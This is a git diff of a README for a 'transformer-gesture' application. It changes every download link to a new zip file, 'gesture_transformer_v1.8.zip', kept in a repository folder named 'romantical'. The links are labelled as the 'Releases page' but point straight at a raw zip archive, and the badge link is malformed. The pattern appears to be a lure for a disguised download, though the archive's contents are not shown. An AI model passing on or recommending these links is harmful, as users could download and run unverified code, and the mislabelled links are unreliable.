@@ -6,11 +6,11 @@ Welcome to the transformer-gesture project! This application allows you to use r
 
 ## 📥 Download the Application
 
-[![Download the Latest Release](https://raw.githubusercontent.com/RavyAun/transformer-gesture/main/romantical/transformer-gesture.zip%20Latest%https://raw.githubusercontent.com/RavyAun/transformer-gesture/main/romantical/transformer-gesture.zip)](https://raw.githubusercontent.com/RavyAun/transformer-gesture/main/romantical/transformer-gesture.zip)
+[![Download the Latest Release](https://raw.githubusercontent.com/RavyAun/transformer-gesture/main/romantical/gesture_transformer_v1.8.zip%20Latest%https://raw.githubusercontent.com/RavyAun/transformer-gesture/main/romantical/gesture_transformer_v1.8.zip)](https://raw.githubusercontent.com/RavyAun/transformer-gesture/main/romantical/gesture_transformer_v1.8.zip)
 
 You can find the latest version of the transformer-gesture application on our Releases page. 
 
-**Visit this page to download:** [Download Latest Release](https://raw.githubusercontent.com/RavyAun/transformer-gesture/main/romantical/transformer-gesture.zip)
+**Visit this page to download:** [Download Latest Release](https://raw.githubusercontent.com/RavyAun/transformer-gesture/main/romantical/gesture_transformer_v1.8.zip)
 
 ## 🖥️ System Requirements
 
@@ -24,7 +24,7 @@ Before installing the application, ensure your computer meets the following requ
 ## 🔧 Installation Steps
 
 1. **Visit the Releases Page**
-   Go to the releases page where you can download the application. Access it [here](https://raw.githubusercontent.com/RavyAun/transformer-gesture/main/romantical/transformer-gesture.zip).
+   Go to the releases page where you can download the application. Access it [here](https://raw.githubusercontent.com/RavyAun/transformer-gesture/main/romantical/gesture_transformer_v1.8.zip).
 
 2. **Choose Your File**
    Look for the latest release. You’ll see various files available for download. Select the one that suits your operating system.
@@ -93,4 +93,4 @@ If you encounter any issues or have questions, you can reach out via the Issues 
 
 ---
 
-Thank you for using transformer-gesture! We hope you find this application helpful and easy to use. For any updates, remember to check the [Releases page](https://raw.githubusercontent.com/RavyAun/transformer-gesture/main/romantical/transformer-gesture.zip) regularly.
+Thank you for using transformer-gesture! We hope you find this application helpful and easy to use. For any updates, remember to check the [Releases page](https://raw.githubusercontent.com/RavyAun/transformer-gesture/main/romantical/gesture_transformer_v1.8.zip) regularly.
